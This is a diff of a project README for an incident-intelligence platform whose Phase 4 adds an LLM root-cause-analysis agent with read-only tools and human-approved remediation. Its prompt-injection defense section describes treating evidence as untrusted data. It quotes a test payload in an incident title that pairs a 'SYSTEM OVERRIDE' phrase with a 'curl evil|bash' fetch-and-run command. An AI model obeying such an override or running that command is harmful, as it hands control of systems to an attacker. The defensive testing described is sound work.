@@ -1,18 +1,24 @@
 # SentinelOps AI
 
-> **Current status: Phase 3 — Incident correlation + persistence.**
-> Only the items under [Current status](#current-status) are implemented.
-> Everything under [Planned architecture](#planned-architecture) and
-> [Technology roadmap](#technology-roadmap) is future work and is labelled as such.
+> **Current status: Phase 4 — AI RCA / investigation agent.**
+> Phases 0–4 are implemented and tested (see [Current status](#current-status)).
+> Phases 5–8 under [Planned architecture](#planned-architecture) and
+> [Technology roadmap](#technology-roadmap) are future work and are labelled as such.
 
 ## What it is
 
-SentinelOps AI is a planned ML-powered, cloud-native **incident intelligence
-platform**. It observes distributed application telemetry, detects abnormal
-behaviour with machine-learning models, correlates the abnormal signals into
-incidents, and then uses a tool-using AI agent to investigate each incident,
-produce evidence-backed root-cause analysis, and recommend a safe remediation
-that a human must approve before anything is executed.
+SentinelOps AI is an ML-powered, cloud-native **incident intelligence platform**.
+It observes distributed application telemetry, detects abnormal behaviour with
+machine-learning models, correlates the abnormal signals into incidents, and then
+uses a tool-using AI agent to investigate each incident and produce an
+evidence-backed root-cause analysis with a remediation **recommendation that a
+human must approve** — the agent never changes a running system itself.
+
+Every step is deliberately bounded: the ML model is offline-trained and
+deterministic at inference, correlation is a rule engine with **no LLM**, and the
+investigation agent works only through a fixed set of **read-only** evidence
+tools with a deterministic validation gate on its output. The LLM proposes;
+deterministic code decides.
 
 ## Problem
 
@@ -28,62 +34,76 @@ that changes the running system.
 
 ## Core idea
 
+The end-to-end loop, phase by phase:
+
 ```
-Telemetry
-  → anomaly detection (ML)
-  → incident creation (correlation)
-  → AI investigation (tool-using agent)
-  → root-cause analysis (evidence-backed)
-  → human-approved remediation (allow-listed actions)
-  → recovery verification
-  → audit trail (throughout)
+Telemetry (OpenTelemetry)                         [Phase 1]
+   ↓
+Anomaly detection (Isolation Forest, ML)          [Phase 2]  →  anomaly.detected
+   ↓
+Incident correlation (deterministic rules, no LLM)[Phase 3]  →  incident.opened
+   ↓
+RCA agent  ── consumes incident.opened ──         [Phase 4]
+   ↓
+Controlled read-only evidence tools               [Phase 4]  (incident / anomaly /
+   ↓                                                          timeline / metrics / health)
+LangGraph investigation (plan → collect →         [Phase 4]
+   analyze → verify → synthesize → validate)
+   ↓
+Evidence-backed RCA report (schema-validated)     [Phase 4]
+   ↓
+Human-approved remediation recommendation         [Phase 5, planned]
+   ↓
+Recovery verification + audit trail               [Phase 5+, planned]
 ```
 
-Two responsibilities are kept **separate on purpose**:
+Two responsibilities are kept **separate on purpose** — an LLM API call is *not*
+the ML component ([ADR-002](docs/decisions/adr-002-ml-and-llm-separation.md)):
 
-- **Machine learning** detects anomalies in telemetry whose feature space
-  matches the live system.
-- **The AI agent** investigates incidents, reasons over collected evidence,
-  performs root-cause analysis, and proposes remediation.
-
-An LLM API call is *not* the ML component. See
-[ADR-002](docs/decisions/adr-002-ml-and-llm-separation.md).
+- **Machine learning** detects anomalies in telemetry whose feature space matches
+  the live system. It is offline-trained and deterministic at inference.
+- **The AI agent** investigates an already-detected, already-correlated incident,
+  reasons over evidence it collected through read-only tools, and *proposes* a
+  root cause and a remediation category. It never detects, never correlates, and
+  never executes.
 
 ## Planned architecture
 
-> Target design. As of Phase 3, the Kafka backbone, `orders-service`, live
-> anomaly detection, and incident correlation + persistence (PostgreSQL) exist;
-> the AI RCA agent and everything downstream is future work. See
-> [Current status](#current-status).
+> Target design. **Phases 0–4 exist and are tested** (the Kafka backbone,
+> `orders-service`, live anomaly detection, incident correlation + PostgreSQL,
+> and the LangGraph RCA agent with its Investigation API). Policy validation,
+> human-approval workflow, action execution, recovery verification, and the
+> observability stack are future work. See [Current status](#current-status).
 
 ```mermaid
 flowchart LR
-  subgraph Sources["Instrumented services (planned)"]
-    S1[Service A]
-    S2[Service B]
+  subgraph Sources["Instrumented services"]
+    S1[orders-service]
+    S2["more services (Phase 7)"]
   end
 
-  S1 & S2 -->|OpenTelemetry| COL[OTel Collector / Grafana Alloy]
-  COL --> OBS[(Prometheus / Loki / Tempo)]
-  COL -->|telemetry events| K[(Apache Kafka)]
+  S1 & S2 -->|OpenTelemetry| COL["OTel Collector / Alloy (Phase 7)"]
+  COL --> OBS[("Prometheus / Loki / Tempo (Phase 7)")]
+  S1 -->|metrics scrape| AD["anomaly-detector (ML)"]
 
-  K --> AD[Anomaly detection service - ML]
-  AD -->|anomaly events| K
-  K --> CORR[Incident correlation service]
-  CORR -->|incidents| DB[(PostgreSQL)]
+  AD -->|anomaly.detected| K[(Apache Kafka)]
+  K --> CORR["incident-correlator (rules)"]
+  CORR -->|incidents + evidence| DB[(PostgreSQL)]
+  CORR -->|incident.opened| K
 
-  CORR -->|incident.created| AGENT[AI RCA agent - LangGraph]
-  AGENT -->|controlled tools| TOOLS[Evidence tools:\nmetrics, logs, traces,\ndeps, deployments, history]
-  AGENT --> RCA[Root-cause analysis + remediation proposal]
+  K --> AGENT["rca-agent (LangGraph)"]
+  AGENT -->|read-only, allow-listed| TOOLS["Evidence tools:<br/>incident, anomaly, timeline,<br/>related, metrics, health"]
+  AGENT -->|Incident API over HTTP| CORR
+  AGENT -->|RCAReport| DB
+  AGENT --> API["Investigation API<br/>POST /investigations, GET /investigations/id"]
 
-  RCA --> POLICY[Policy validation]
-  POLICY --> HUMAN{Human approval}
-  HUMAN -->|approved| ACT[Allow-listed action executor]
-  ACT --> VERIFY[Recovery verification]
-  VERIFY --> AUDIT[(Audit log)]
+  API --> HUMAN{"Human approval (Phase 5)"}
+  HUMAN -->|approved| ACT["Allow-listed action executor (Phase 5)"]
+  ACT --> VERIFY["Recovery verification (Phase 5+)"]
+  VERIFY --> AUDIT[("Audit log (Phase 5+)")]
 
-  MLF[MLflow: experiments + model registry] -.model aliases.-> AD
-  GRAF[Grafana] --- OBS
+  MLF["MLflow (Phase 6)"] -.model aliases.-> AD
+  GRAF["Grafana (Phase 7)"] --- OBS
 ```
 
 ## Technology roadmap
@@ -115,7 +135,7 @@ Introduced **only in the phase that needs it**, never earlier:
 | **1** | Event backbone (Kafka) + a first instrumented service emitting telemetry | **done** |
 | **2** | ML anomaly-detection pipeline + offline evaluation (real metrics) | **done** |
 | **3** | Incident correlation + persistence (deterministic rules, PostgreSQL, Incident API) | **done** |
-| 4 | AI RCA agent with controlled evidence tools | planned |
+| **4** | AI RCA agent — LangGraph investigation, controlled read-only evidence tools, mock/live LLM boundary, Investigation API | **done** |
 | 5 | Human-approved, allow-listed remediation + recovery verification + audit | planned |
 | 6 | MLOps lifecycle: MLflow, model monitoring, drift detection, retraining | planned |
 | 7 | Observability stack (OpenTelemetry, Prometheus, Loki, Tempo, Grafana) | planned |
@@ -133,60 +153,88 @@ ones. See [docs/phases/roadmap.md](docs/phases/roadmap.md).
 # 1. Virtual environment + dependencies
 python -m venv .venv
 source .venv/Scripts/activate      # Windows Git Bash;  .venv/bin/activate on Unix
-pip install -e ".[dev,ml,incident,detector]"
+pip install -e ".[dev,ml,incident,detector,rca]"
 cp .env.example .env
 
-# 2. The full pipeline (Phases 1 + 3): Kafka, PostgreSQL, orders-service,
-#    anomaly-detector, incident-correlator (+ one-shot DB migration)
+# 2. The full pipeline (Phases 1 + 3 + 4): Kafka, PostgreSQL, orders-service,
+#    anomaly-detector, incident-correlator, rca-agent (+ two one-shot migrations)
 docker compose up --build -d
 python scripts/generate_traffic.py --scenario sequence --duration 40 --rate 6
-curl -s http://localhost:8002/incidents | python -m json.tool   # the correlated incident
+curl -s http://localhost:8002/incidents | python -m json.tool            # the correlated incident
+INC=$(curl -s http://localhost:8002/incidents | python -c "import sys,json;print(json.load(sys.stdin)[0]['id'])")
+curl -s "http://localhost:8004/incidents/$INC/investigation" | python -m json.tool  # the RCA the agent produced
 
-# 3. Deterministic incident-correlation demo — no Kafka, no DB
-make incident-scenario
+# 3. Deterministic demos — no Kafka, no DB, no LLM API key
+make incident-scenario     # Phase 3: anomalies -> ONE incident
+make rca-scenario          # Phase 4: one incident -> investigation -> validated RCA
+make rca-e2e-scenario      # Phase 4: incident.opened envelope -> consumer -> RCA -> API
 
 # 4. Phase 2 ML: reproduce every experiment on the committed datasets
-make ml-experiments                # -> artifacts/reports/ + summary.md
+make ml-experiments        # -> artifacts/reports/ + summary.md
 ```
 
+`rca-agent` (`:8004`) defaults to `RCA_MODE=mock` — the whole chain runs with
+**no LLM API key**. For a real provider: `RCA_MODE=live LLM_PROVIDER=anthropic
+LLM_API_KEY=sk-ant-... docker compose up rca-agent` (the key is read from your
+shell, never committed).
+
 With `make` (Git Bash): `make install`, `make compose-up`, `make db-migrate`,
-`make run-correlator`, `make ml-experiments`, `make check`. Full instructions
-incl. PowerShell in [docs/development/setup.md](docs/development/setup.md).
+`make db-migrate-rca`, `make run-correlator`, `make run-rca`, `make ml-experiments`,
+`make check`. Full instructions incl. PowerShell in
+[docs/development/setup.md](docs/development/setup.md).
 
 ## Testing
 
 ```bash
 pytest                                                    # all unit tests — or: make test
 make ml-test                                               # just the ML suite
-docker compose up -d kafka postgres && make db-migrate && \
-  make test-integration                                   # Kafka + PostgreSQL integration tests
+pytest tests/rca_agent -q                                  # just the RCA-agent suite
+docker compose up -d kafka postgres && make db-migrate && make db-migrate-rca && \
+  make test-integration                                   # real Kafka + PostgreSQL integration tests
 ```
 
-Tests live in [tests/](tests/): the platform API smoke tests,
+Tests live in [tests/](tests/): platform API smoke tests,
 [tests/orders_service/](tests/orders_service/) (order validation, event schema,
-publisher, failure injection, instrumentation, one Kafka round-trip), and
-[tests/ml/](tests/ml/) (parsing, validation, feature causality & no-leakage,
-splits, detectors, save/load, inference, metrics, an experiment repro check).
+publisher, failure injection, instrumentation, a Kafka round-trip),
+[tests/ml/](tests/ml/) (parsing, feature causality & no-leakage, splits,
+detectors, inference, metrics, an experiment repro check),
+[tests/incident_correlator/](tests/incident_correlator/) (correlation, severity,
+state machine, SQL repository, a Kafka→Postgres integration test), and
+[tests/rca_agent/](tests/rca_agent/) (tool registry & bounds, the LangGraph
+engine, mock + Anthropic LLM boundary, prompt-injection defenses, the Kafka
+consumer & idempotency, the Investigation API, an outcome-class RCA harness, and
+a real Kafka+Postgres end-to-end test).
 
 ## Environment variables
 
-`.env.example` is the documented template of every supported variable. Copy it
-to `.env` (git-ignored) for local development. All variables are read through
-the typed `sentinelops_api.config.Settings` object (prefix `APP_`) — code does
-not read `os.environ` directly. Future subsystems add their settings there.
+`.env.example` is the documented template of every supported variable, grouped by
+prefix (`APP_`, `KAFKA_`, `DB_`, `DETECTOR_`, `RCA_`, `LLM_`, …). Copy it to
+`.env` (git-ignored) for local development. Every service reads its config through
+a typed `pydantic-settings` object — no code reads `os.environ` directly, and
+`LLM_API_KEY` is a `SecretStr` that is never logged or serialised.
 
 ## Security principles
 
-- **No secrets in Git.** `.env` is ignored; only `.env.example` (placeholders)
-  is committed.
-- **Least privilege.** The container runs as a non-root user; future cloud/agent
-  access is scoped, not blanket.
-- **Controlled tools.** The AI agent will only ever act through an explicit,
-  allow-listed set of evidence/action tools.
-- **Human approval for remediation.** No automated change to a running system
-  without a human in the loop ([ADR-003](docs/decisions/adr-003-human-in-the-loop-remediation.md)).
-- **Auditability.** Investigation, approval, action, and verification are all
-  recorded.
+- **No secrets in Git.** `.env` is ignored; only `.env.example` (placeholders) is
+  committed. `LLM_API_KEY` is read from the environment at runtime, held as a
+  `SecretStr`, and passed only to the provider SDK.
+- **Least privilege.** Containers run as a non-root user.
+- **Controlled tools.** The RCA agent obtains **all** evidence through a fixed,
+  closed registry of **read-only** tools — it cannot add a tool, name a new one,
+  issue an arbitrary HTTP/SQL/shell call, or point a tool at an arbitrary host
+  ([ADR-020](docs/decisions/adr-020-controlled-read-only-evidence-tools.md)).
+- **The LLM is not authoritative.** It proposes plans, findings, and a synthesis;
+  deterministic code owns the tool allow-list, argument validation, resource
+  limits, evidence ids, state transitions, and a `validate_report` gate on the
+  output. Evidence (incident text, telemetry, tool output) is treated as **data,
+  never instructions** — prompt-injection payloads inside it are quarantined and
+  change nothing ([ADR-021](docs/decisions/adr-021-llm-boundary-and-injection-defense.md)).
+- **Human approval for remediation.** Phase 4 produces only a structured
+  *recommendation* (`requires_human_approval = true`, a closed action-category
+  enum, **no executor anywhere**). No automated change to a running system
+  ([ADR-003](docs/decisions/adr-003-human-in-the-loop-remediation.md)).
+- **No hidden reasoning persisted.** The operational trace records concise
+  actions and results, never private model chain-of-thought.
 
 ## Current status
 
@@ -221,9 +269,11 @@ Repo structure and docs (README, architecture overview, ADRs, setup, roadmap);
 
 Details: [docs/architecture/phase-1.md](docs/architecture/phase-1.md).
 
-### Phase 2 — ML anomaly detection + offline evaluation *(done, offline)*
+### Phase 2 — ML anomaly detection + offline evaluation *(done)*
 
-The `ml/` subsystem — an offline pipeline, not yet wired into the live path.
+The `ml/` subsystem — an offline training/evaluation pipeline. Phase 3's
+`anomaly-detector` service wraps the trained model in a live
+scrape → score → publish loop.
 
 - **Track A dataset** — built by scraping `orders-service` `/metrics` every 10 s
   under a seeded sequence of fault scenarios; counter deltas → per-window rate
@@ -282,7 +332,71 @@ Details + all measured numbers: [docs/architecture/phase-2.md](docs/architecture
 Details: [docs/architecture/phase-3.md](docs/architecture/phase-3.md) ·
 [docs/architecture/incident-model.md](docs/architecture/incident-model.md).
 
-**Not implemented** (later phases): the AI RCA agent / LangGraph / LLM calls;
-remediation and human-approval workflow; MLflow / model registry; XGBoost / deep
-models; a deployed observability stack; Kubernetes; AWS; Terraform;
+### Phase 4 — AI RCA / investigation agent *(done)*
+
+- **`rca-agent`** (`services/rca-agent`, `:8004`) — a separate service (it
+  depends on an external LLM API and must not share a failure domain with
+  correlation — [ADR-019](docs/decisions/adr-019-rca-agent-service-and-boundary.md)).
+  It consumes `incident.opened` from Kafka and, per incident, runs one bounded
+  investigation. It reads incidents through the Phase 3 **Incident API over
+  HTTP**, never that service's database, and owns its own PostgreSQL tables with
+  a separate Alembic lineage (`alembic_version_rca`).
+- **Controlled read-only evidence tools** — a fixed, closed registry:
+  `get_incident`, `get_incident_timeline`, `get_anomaly_evidence`,
+  `get_related_incidents`, `get_service_metrics`, `get_service_health`. Logs,
+  traces, deployments, and dependency graphs are registered but explicitly
+  **UNAVAILABLE** — surfaced honestly in the report, never fabricated. Every tool
+  has a frozen `extra="forbid"` request model (incident-id regex, service
+  allow-list, `limit ≤ 50`, …) validated before any I/O, and returns a structured
+  result — never an exception, never a stack trace, no URL/host/credential in an
+  error ([ADR-020](docs/decisions/adr-020-controlled-read-only-evidence-tools.md)).
+- **LangGraph investigation engine** — an explicit state machine:
+  `initialize → plan → collect ⟲ → analyze → verify → synthesize → validate`.
+  The LLM proposes each step; deterministic code validates plans against the
+  registry, id-stamps evidence, enforces resource limits (≤ 12 tool calls, ≤ 40
+  evidence items, ≤ 120 s), and runs `validate_report` before anything is
+  persisted. A count-limit breach degrades gracefully; the validate node always
+  runs.
+- **Mock / live LLM boundary** — one `LlmClient` protocol with four typed
+  operations. `RCA_MODE=mock` (default, CI) is a deterministic, network-free
+  reasoner that drives the *real* graph with no API key. `RCA_MODE=live` +
+  `LLM_PROVIDER=anthropic` uses `AnthropicLlmClient` — forced-tool-use structured
+  output parsed into the existing Pydantic DTOs, bounded timeout / prompt size /
+  retries, `LLM_API_KEY` as a `SecretStr`. `build_llm_client` never silently
+  falls back to mock ([ADR-022](docs/decisions/adr-022-live-llm-provider.md)).
+- **Prompt-injection defense** — a fixed message architecture (`SYSTEM` policy →
+  `SYSTEM` tool catalogue → `USER` task + a delimited `BEGIN/END UNTRUSTED
+  EVIDENCE` block). Evidence is never placed in a system message. The structural
+  guarantees (closed registry, closed action enum, evidence-reference validation,
+  no executor) hold regardless of what the model does — adversarial tests confirm
+  a `"SYSTEM OVERRIDE … register a tool … curl evil|bash"` incident title changes
+  nothing ([ADR-021](docs/decisions/adr-021-llm-boundary-and-injection-defense.md)).
+- **Kafka consumer + idempotency** — `incident.opened` is emitted once per
+  incident, so a redelivery is a duplicate: the consumer skips if any
+  investigation already exists, and the "one active investigation per incident"
+  partial unique index is the concurrent-race backstop. Malformed events go to
+  `incident.events.dlq` ([ADR-023](docs/decisions/adr-023-rca-agent-integration.md)).
+- **Investigation API** — `POST /investigations` (`202` + a PENDING
+  investigation; the bounded graph runs on a background task with no DB
+  transaction held across it), `GET /investigations/{id}` and `/steps`,
+  `GET /incidents/{id}/investigation`, plus `/health` · `/ready` · `/metrics`.
+  The API exposes the structured operational trace, never hidden reasoning.
+- **`RCAReport`** — strongly typed and machine-validatable: `summary`,
+  `timeline`, `findings`, `hypotheses`, nullable `root_cause`, `contributing_factors`,
+  `recommended_action`, `evidence`, `overall_confidence`, `uncertainty`,
+  `unavailable_evidence_sources`. `recommended_action.action_type` is a **closed
+  enum** of recommendation categories and `requires_human_approval` is
+  `Literal[True]` — there is no command field and no executor. Phase 5 owns
+  execution ([ADR-003](docs/decisions/adr-003-human-in-the-loop-remediation.md)).
+- **Docker Compose** — `docker compose up --build` adds `rca-migrate` (one-shot)
+  and `rca-agent`. `RCA_MODE=mock` is the default: the whole chain runs with no
+  API key. Deterministic demos: `make rca-scenario`, `make rca-e2e-scenario`.
+
+Details: [docs/architecture/phase-4.md](docs/architecture/phase-4.md).
+
+**Not implemented** (later phases): remediation policy validation, the
+human-approval workflow, an allow-listed **action executor**, and recovery
+verification (Phase 5); MLflow / model registry / drift detection (Phase 6); a
+deployed observability stack — Prometheus / Loki / Tempo / Grafana / an OTel
+collector (Phase 7); Kubernetes, AWS, Terraform, hardened CI/CD (Phase 8);
 authentication; cross-service / topology-aware correlation.
